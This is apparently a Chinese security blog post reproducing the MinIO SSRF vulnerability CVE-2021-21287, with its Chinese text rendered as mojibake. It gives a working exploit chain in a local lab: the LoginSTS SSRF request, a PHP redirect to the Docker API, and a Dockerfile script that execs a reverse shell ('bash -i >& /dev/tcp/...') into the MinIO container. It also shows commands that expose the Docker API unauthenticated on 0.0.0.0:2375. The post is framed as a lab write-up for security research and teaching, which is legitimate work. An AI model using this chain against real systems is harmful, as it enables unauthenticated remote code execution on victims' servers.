<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9OavrcdczSZDXler5IpiQQ)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcS1sDKyklf0czsJtbOGYGtUNHdgyo9ueIQoVbj86fd1pIF3TLQnZztyeibAiaS43iaLFe7EuGmRo0sA/640?wx_fmt=png)

MinIO æœªæˆæƒ SSRF æ¼æ´ (CVE-2021-21287)

ä¸€ã€æ¼æ´ç®€ä»‹

ç”±äº MinIO ç»„ä»¶ä¸­ LoginSTS æ¥å£è®¾è®¡ä¸å½“ï¼Œå¯¼è‡´å­˜åœ¨æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´

æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€  URL æ¥å‘èµ·æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åˆ©ç”¨æœåŠ¡å™¨ä¸Šçš„åŠŸèƒ½æ¥è¯»å–ã€æ›´æ–°å†…éƒ¨èµ„æºæˆ–æ‰§è¡Œä»»æ„å‘½ä»¤

è¯¥æ¼æ´æ— éœ€ç”¨æˆ·éªŒè¯å³å¯è¿œç¨‹åˆ©ç”¨

äºŒã€å½±å“ç‰ˆæœ¬

MinIO < RELEASE.2021-01-30T00-20-58Z

ä¸‰ã€ç¯å¢ƒå‡†å¤‡ & æ¼æ´å¤ç°

Docker å®‰è£…Â minioï¼š

docker-compose.yml

```
version: '3.7'
services:
  minio1:
    image: minio/minio:RELEASE.2021-01-16T02-19-44Z
    volumes:
      - data1-1:/data1
      - data1-2:/data2
    ports:
      - "9000:9000"
    environment:
      MINIO_ACCESS_KEY: minio
      MINIO_SECRET_KEY: minio123
    command: server http://minio{1...4}/data{1...2}
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 30s
      timeout: 20s
      retries: 3


## By default this config uses default local driver,
## For custom volumes replace with volume driver configuration.
volumes:
  data1-1:
  data1-2:
```

å¯åŠ¨ç¯å¢ƒï¼š

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcS1sDKyklf0czsJtbOGYGtzdNRrkC7eUWAA7ETzjotZpYB09jBYCVCm9FOyK1m6ZYibJGyorn3SZQ/640?wx_fmt=png)

é¦–é¡µæ ·å¼ï¼š

http://192.168.1.108:9000/minio/login

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcS1sDKyklf0czsJtbOGYGtoGrJZvkcavS9CDoSFgGH8T1UtZLicyejItlalcPoyyIgAwfr0Pt2Micw/640?wx_fmt=png)

1ã€éªŒè¯ SSRF

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcS1sDKyklf0czsJtbOGYGtdhjgic8k2k1XdnAYs8VgJDy5PxO8LAic4Hm0hPohEpdYDz7EJpngTqQQ/640?wx_fmt=png)

å…·ä½“æ•°æ®åŒ…ï¼š  

```
POST /minio/webrpc HTTP/1.1
Host: 192.168.1.104:1234
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 79

{"id":1,"jsonrpc":"2.0","params":{"token":     "test"},"method":"web.LoginSTS"}
```

2ã€ssrf åå¼¹ shell

web æœåŠ¡ä¸‹é¢æ”¾æ–‡ä»¶ï¼šindex.phpï¼ˆapacheï¼‰

```
<?php
header('Location: http://192.168.1.108:2375/build?remote=http://192.168.1.104/Dockerfile&nocache=true&t=evil:1', false, 307);
```

åå¼¹ shell æ–‡ä»¶ï¼š

DockerFile å¦‚ä¸‹ï¼š

```
FROM alpine:3.13

RUN apk add curl bash jq

RUN set -ex && \
    { \
        echo '#!/bin/bash'; \
        echo 'set -ex'; \
        echo 'target="http://192.168.1.108:2375"'; \
        echo 'jsons=$(curl -s -XGET "${target}/containers/json" | jq -r ".[] | @base64")'; \
        echo 'for item in ${jsons[@]}; do'; \
        echo '    name=$(echo $item | base64 -d | jq -r ".Image")'; \
        echo '    if [[ "$name" == *"minio/minio"* ]]; then'; \
        echo '        id=$(echo $item | base64 -d | jq -r ".Id")'; \
        echo '        break'; \
        echo '    fi'; \
        echo 'done'; \
        echo 'execid=$(curl -s -X POST "${target}/containers/${id}/exec" -H "Content-Type: application/json" --data-binary "{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/192.168.1.104/888 0>&1\"]}" | jq -r ".Id")'; \
        echo 'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"'; \
    } | bash
```

å…·ä½“æ“ä½œæ•°æ®åŒ…ï¼š

```
POST /minio/webrpc HTTP/1.1
Host: 192.168.1.104
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 79

{"id":1,"jsonrpc":"2.0","params":{"token":     "test"},"method":"web.LoginSTS"}
```

ä¸ºäº†å¥½çš„å±•ç¤ºå½•äº†ä¸€ä¸ªå°è§†é¢‘ã€‚

è¿‡ç¨‹æ¯ç‡¥ç­‰å¾…è¾ƒé•¿ï¼šåŠ äº†ä¸€ä¸ª BGM

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcS1sDKyklf0czsJtbOGYGtwoBMk7O8ccR0rNaE8snTQusnOoaOicJWIdwzh07GX3olCNiafAuyttiaw/640?wx_fmt=png)

è§†é¢‘ï¼š  

æ“ä½œè§†é¢‘çš„ç»“æœï¼š  

æ³¨æ„âš ï¸ï¼š  

å› ä¸ºè‡ªå·± Docker API å·²å¼€å¯ï¼Œè¿‡ç¨‹æœªå†™å…¥å…¶ä¸­ã€‚

å¼€å¯ Docker API å‚è€ƒï¼š  

```
æ‰“å¼€é…ç½®æ–‡ä»¶æ‰¾åˆ°
ExecStart=/usr/bin/dockerdÂ 

ä¿®æ”¹ä¸º
ExecStart=/usr/bin/dockerd  -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
é‡å¯

$ systemctl daemon-reload
$ systemctl restart docker
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcS1sDKyklf0czsJtbOGYGtCAWpH0zzmfVyNAIYIj9hICmo57IuzNK6VBGZETuicdvVUdwWCiapmIJw/640?wx_fmt=png)

è¿‡ç¨‹ä¸­è¿˜æ˜¯å¾ˆå¤šå‘éœ€è¦å»çˆ¬ğŸ˜‚ğŸ˜‚ğŸ˜‚ï¼ˆå¤šæ¬¡å°è¯•æœªæœï¼Œæœ€åæˆåŠŸï¼Œéƒ¨åˆ†ç»†èŠ‚æœªè®°å½•ä¸¢å¤±äº†ï¼‰

æ—¶é—´åŒ†å¿™æœ‰äº›ç²—ç³™æœ›è§è°…ğŸ™

SSRF-pocï¼š  

```
POST /minio/webrpc HTTP/1.1
Host: ç›‘å¬åœ°å€
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 79


{"id":1,"jsonrpc":"2.0","params":{"token":     "test"},"method":"web.LoginSTS"}
```

å‚è€ƒï¼š  

https://mp.weixin.qq.com/s/X04IhY9Oau-kDOVbok8wEw

https://www.o2oxy.cn/3104.html

https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html

å…è´£å£°æ˜ï¼šæœ¬ç«™æä¾›å®‰å…¨å·¥å…·ã€ç¨‹åº (æ–¹æ³•) å¯èƒ½å¸¦æœ‰æ”»å‡»æ€§ï¼Œä»…ä¾›å®‰å…¨ç ”ç©¶ä¸æ•™å­¦ä¹‹ç”¨ï¼Œé£é™©è‡ªè´Ÿ!

è½¬è½½å£°æ˜ï¼šè‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚

è®¢é˜…æŸ¥çœ‹æ›´å¤šå¤ç°æ–‡ç« ã€å­¦ä¹ ç¬”è®°

thelostworld

å®‰å…¨è·¯ä¸Šï¼Œä¸ä½ å¹¶è‚©å‰è¡Œï¼ï¼ï¼ï¼

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

ä¸ªäººçŸ¥ä¹ï¼šhttps://www.zhihu.com/people/fu-wei-43-69/columns

ä¸ªäººç®€ä¹¦ï¼šhttps://www.jianshu.com/u/bf0e38a8d400

ä¸ªäºº CSDNï¼šhttps://blog.csdn.net/qq_37602797/category_10169006.html

ä¸ªäººåšå®¢å›­ï¼šhttps://www.cnblogs.com/thelostworld/

FREEBUF ä¸»é¡µï¼šhttps://www.freebuf.com/author/thelostworld?type=article

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

æ¬¢è¿æ·»åŠ æœ¬å…¬ä¼—å·ä½œè€…å¾®ä¿¡äº¤æµï¼Œæ·»åŠ æ—¶å¤‡æ³¨ä¸€ä¸‹ â€œå…¬ä¼—å·â€  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)